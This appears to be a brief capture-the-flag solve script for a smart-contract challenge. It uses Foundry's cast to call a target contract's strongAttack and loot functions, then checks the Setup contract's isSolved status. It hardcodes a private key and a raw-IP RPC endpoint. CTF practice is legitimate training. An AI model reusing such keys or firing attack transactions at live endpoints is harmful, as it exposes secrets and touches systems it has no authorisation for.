PRIV_KEY="0xe6e1727e94191bf1ed3c5fb25db9b728977629970d2501dea9c72d80b66ff4d9"
ADDR_USER="0xCaEF70543b38dE92A7be8bB59a0Aa3E7E0D27727"
TARGET="0x3e4C783ACC97b5199083a2CE63A9965017268EA3"
SETUP="0x8e0F7399f83966247cf0069564B0BE6cb76a71C2"
RPC="http://157.245.39.76:30993/rpc"

cast call $SETUP "isSolved()" --rpc-url $RPC

cast send $TARGET "strongAttack(uint256)" 20 --rpc-url $RPC --private-key $PRIV_KEY
cast send $TARGET "loot()" --rpc-url $RPC --private-key $PRIV_KEY

cast call $SETUP "isSolved()" --rpc-url $RPC